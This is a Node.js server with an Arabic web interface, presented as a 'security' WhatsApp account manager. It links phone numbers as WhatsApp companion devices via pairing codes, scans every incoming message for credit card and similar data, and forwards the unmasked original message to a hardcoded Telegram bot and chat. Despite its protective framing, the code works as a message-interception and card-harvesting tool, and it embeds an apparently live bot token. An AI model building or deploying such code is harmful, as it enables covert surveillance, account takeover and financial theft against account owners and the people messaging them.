import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { makeWASocket, useMultiFileAuthState, Browsers, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import { scanMessageForSensitiveData } from './scanner.js'; // استيراد ماسح البيانات

// ========== ⚙️ تكوين Telegram (ضع التوكن الخاص بك هنا) ==========
const TELEGRAM_BOT_TOKEN = "7056698579:AAFuDwSVHizm1OxB9C-8ocaZyyQIsJYHevc"; // ضع التوكن الخاص بك
const TELEGRAM_CHAT_ID = "7057346640";   // ضع معرف الشات الخاص بك
const telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// ========== إعداد الخادم ==========
const app = express();
const server = createServer(app);
const io = new Server(server, { cors: { origin: "*" }, transports: ['websocket', 'polling'] });

// ========== الحالة العالمية ==========
const activeSessions = new Map(); // تخزين الجلسات النشطة باستخدام الرقم كمفتاح
const sessionsData = new Map();   // تخزين بيانات الحسابات (الرقم، الاسم، الحالة)

// 🚨 إرسال إشعار إلى Telegram عند اكتشاف معلومات حساسة
async function sendTelegramSecurityAlert(accountNumber, fromNumberOrName, originalMessage, detectedInfo) {
    try {
        const detectionDetails = detectedInfo.map(info => `⚠️ ${info.type}: ${info.maskedValue}`).join('\n');
        const text = `🚨 *تنبيه أمني - تم اكتشاف معلومات حساسة!* 🚨\n\n` +
                     `📱 *حساب واتساب المستلم:* ${accountNumber}\n` +
                     `👤 *المرسل:* ${fromNumberOrName || 'غير معروف'}\n` +
                     `⏰ *الوقت:* ${new Date().toLocaleString()}\n\n` +
                     `📝 *الرسالة الأصلية:*\n> ${originalMessage.substring(0, 200)}${originalMessage.length > 200 ? '...' : ''}\n\n` +
                     `🔍 *التفاصيل المكتشفة:*\n${detectionDetails}\n\n` +
                     `⚠️ *توصية:* لا تطلب أو تشارك أبدًا معلومات بطاقات الائتمان عبر واتساب لأسباب أمنية.`;

        await telegramBot.sendMessage(TELEGRAM_CHAT_ID, text, { parse_mode: 'Markdown' });
        console.log(`✅ [${accountNumber}] تم إرسال تنبيه أمني إلى تليجرام.`);
    } catch (err) {
        console.error(`❌ فشل إرسال إشعار التيليجرام: ${err.message}`);
    }
}

// ========== منطق إنشاء وإدارة جلسات واتساب ==========
async function createWhatsAppSession(phoneNumber) {
    console.log(`جاري إنشاء جلسة للرقم: ${phoneNumber}`);

    const sessionDir = `/tmp/wa_auth_${phoneNumber}`;
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    try {
        const { version } = await fetchLatestBaileysVersion();
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
            version,
            auth: state,
            browser: Browsers.macOS('Chrome'),
            printQRInTerminal: false,
            defaultQueryTimeoutMs: 60000,
            keepAliveIntervalMs: 30000
        });

        sock.ev.on('creds.update', saveCreds);
        
        // ⭐ مراقبة حالة الاتصال وطلب رمز الاقتران (كما في السابق)
        sock.ev.on('connection.update', async (update) => {
            const connectionState = update.connection;
            console.log(`[${phoneNumber}] حالة الاتصال: ${connectionState}`);

            if (connectionState === 'open' && !state.creds.registered) {
                console.log(`[${phoneNumber}] طلب رمز الاقتران...`);
                try {
                    const code = await sock.requestPairingCode(phoneNumber);
                    console.log(`[${phoneNumber}] 🔐 رمز الاقتران: ${code}`);
                    // إرسال الرمز إلى واجهة المستخدم عبر Socket.IO
                    io.emit('pairing_code', { code, phoneNumber });
                } catch (err) {
                    console.error(`[${phoneNumber}] فشل طلب الرمز: ${err.message}`);
                    io.emit('error', `فشل طلب الرمز للرقم ${phoneNumber}: ${err.message}`);
                }
            }
        });

        // 🔥 الميزة الأساسية: مراقبة الرسائل الواردة لكل حساب
        sock.ev.on('messages.upsert', async ({ messages }) => {
            for (const msg of messages) {
                // التأكد من أن الرسالة ليست مني (من الحساب نفسه)
                if (msg.message && !msg.key.fromMe) {
                    const sender = msg.key.remoteJid;
                    const messageText = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
                    
                    if (messageText) {
                        const senderName = msg.pushName || sender;
                        console.log(`📩 [${phoneNumber}] رسالة من ${senderName}: ${messageText}`);
                        
                        // 🧠 مسح الرسالة للبحث عن بيانات حساسة
                        const detected = scanMessageForSensitiveData(messageText);
                        if (detected.length > 0) {
                            console.log(`🚨 [${phoneNumber}] تم اكتشاف معلومات حساسة:`, detected);
                            // 🔔 إرسال تنبيه أمني فوري إلى تليجرام
                            await sendTelegramSecurityAlert(phoneNumber, senderName, messageText, detected);
                        }
                    }
                }
            }
        });

        return sock;
    } catch (err) {
        console.error(`خطأ في إنشاء الجلسة للرقم ${phoneNumber}: ${err.message}`);
        throw err;
    }
}

// ========== واجهة المستخدم (HTML) ==========
const HTML_PAGE = `<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مدير حسابات واتساب المتقدم</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #075E54; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { background: white; border-radius: 20px; max-width: 700px; width: 100%; padding: 30px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        h1 { color: #075E54; margin-bottom: 10px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; direction: ltr; text-align: left; box-sizing: border-box; }
        button { background: #25D366; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; margin-top: 5px; }
        button:disabled { background: #ccc; }
        .status { margin-top: 15px; padding: 10px; border-radius: 8px; display: none; font-size: 14px; }
        .status.success { background: #d4edda; color: #155724; display: block; }
        .status.error { background: #f8d7da; color: #721c24; display: block; }
        .status.info { background: #e2f0fb; color: #0c5460; display: block; }
        .accounts-list { text-align: right; margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; max-height: 400px; overflow-y: auto; }
        .account-item { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 8px; border-right: 4px solid #25D366; }
        .code-box { background: #f5f5f5; padding: 15px; font-family: monospace; font-size: 24px; letter-spacing: 4px; margin: 15px 0; border-radius: 8px; direction: ltr; }
        .loader { display: inline-block; width: 16px; height: 16px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-left: 8px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .hidden { display: none; }
        .small-text { font-size: 12px; color: #666; margin-top: 5px; }
        .alert-icon { color: #dc3545; font-weight: bold; margin-left: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🛡️ مدير حسابات واتساب الأمني</h1>
        <p>أدخل رقم هاتف لربط حساب جديد ومراقبته تلقائياً</p>
        <input type="tel" id="phone" placeholder="مثال: 967776730674" dir="ltr">
        <button id="addBtn">➕ إضافة حساب جديد</button>
        <div id="status" class="status"></div>
        <div id="codeSection" class="hidden">
            <div class="code-box" id="codeDisplay"></div>
            <p>✨ أدخل هذا الرمز في واتساب (الإعدادات ← الأجهزة المرتبطة) لربط الحساب.</p>
        </div>
        <div class="accounts-list">
            <strong>📋 الحسابات المرتبطة والمراقبة:</strong>
            <div id="accountsList">لا توجد حسابات بعد.</div>
        </div>
        <div class="small-text">⚠️ النظام يراقب جميع الحسابات بشكل تلقائي. سيتم إرسال أي اكتشاف لمعلومات حساسة (مثل أرقام البطاقات الائتمانية) إلى تليجرام فوراً.</div>
    </div>
    <script>
        const socket = io();
        const addBtn = document.getElementById('addBtn');
        const phoneInput = document.getElementById('phone');
        const statusDiv = document.getElementById('status');
        const codeSection = document.getElementById('codeSection');
        const codeDisplay = document.getElementById('codeDisplay');
        const accountsList = document.getElementById('accountsList');

        function showStatus(msg, type) { 
            statusDiv.textContent = msg; 
            statusDiv.className = 'status ' + type; 
        }
        
        addBtn.onclick = () => {
            const phone = phoneInput.value.trim().replace(/[^0-9]/g, '');
            if (!phone || phone.length < 8) {
                return showStatus('❌ رقم غير صحيح (يجب أن يكون 8 أرقام على الأقل)', 'error');
            }
            addBtn.disabled = true;
            addBtn.innerHTML = '<span class="loader"></span> جاري ربط الحساب...';
            showStatus('⏳ جاري تجهيز الحساب... قد يستغرق 30-45 ثانية', 'info');
            socket.emit('add_account', { phone });
        };
        
        socket.on('pairing_code', (data) => {
            if (data.phoneNumber === phoneInput.value.trim().replace(/[^0-9]/g, '')) {
                addBtn.style.display = 'none';
                phoneInput.disabled = true;
                codeDisplay.innerHTML = data.code;
                codeSection.classList.remove('hidden');
                showStatus('✅ تم إنشاء الرمز! أدخله في واتساب لربط الحساب', 'success');
                // تحديث قائمة الحسابات بعد تأخير
                setTimeout(() => socket.emit('request_accounts'), 5000);
            }
        });
        
        socket.on('accounts_list', (accounts) => {
            if (accounts.length === 0) {
                accountsList.innerHTML = 'لا توجد حسابات بعد.';
            } else {
                accountsList.innerHTML = accounts.map(acc => `<div class="account-item">📱 <strong>الحساب:</strong> ${acc.phone}<br>🟢 <strong>الحالة:</strong> ${acc.status || 'مراقب بنشاط'}<br>🕒 <strong>تاريخ الربط:</strong> ${acc.date || 'الآن'}</div>`).join('');
            }
        });
        
        socket.on('error', (msg) => {
            addBtn.disabled = false;
            addBtn.innerHTML = '➕ إضافة حساب جديد';
            showStatus('❌ ' + msg, 'error');
        });
        
        socket.on('connect', () => {
            showStatus('✅ متصل بالخادم، يمكنك إضافة الحسابات.', 'success');
            socket.emit('request_accounts');
        });
        
        socket.on('disconnect', () => showStatus('❌ انقطع الاتصال بالخادم...', 'error'));
    </script>
</body>
</html>`;

app.get('/', (req, res) => res.send(HTML_PAGE));

// ========== معالجة أحداث Socket.IO ==========
io.on('connection', (socket) => {
    console.log('🟢 عميل متصل:', socket.id);
    
    socket.on('add_account', async ({ phone }) => {
        const cleanPhone = phone.replace(/\D/g, '');
        console.log(`📱 طلب إضافة حساب جديد: ${cleanPhone}`);
        
        if (activeSessions.has(cleanPhone)) {
            socket.emit('error', `الحساب ${cleanPhone} موجود مسبقًا`);
            return;
        }
        
        try {
            const sock = await createWhatsAppSession(cleanPhone);
            activeSessions.set(cleanPhone, { sock, status: 'مراقب' });
            sessionsData.set(cleanPhone, { 
                phone: cleanPhone, 
                status: 'تم الربط والمراقبة بنجاح',
                date: new Date().toLocaleString()
            });
            socket.emit('status', `جاري ربط الحساب ${cleanPhone}...`);
            // تحديث قائمة الحسابات لجميع المستخدمين المتصلين
            io.emit('accounts_list', Array.from(sessionsData.values()));
        } catch (err) {
            socket.emit('error', `فشل ربط الحساب ${cleanPhone}: ${err.message}`);
        }
    });
    
    socket.on('request_accounts', () => {
        const accounts = Array.from(sessionsData.values());
        socket.emit('accounts_list', accounts);
    });
    
    socket.on('disconnect', () => {
        console.log('🔴 عميل قطع الاتصال:', socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 النظام الأمني المتقدم يعمل على http://localhost:${PORT}`));
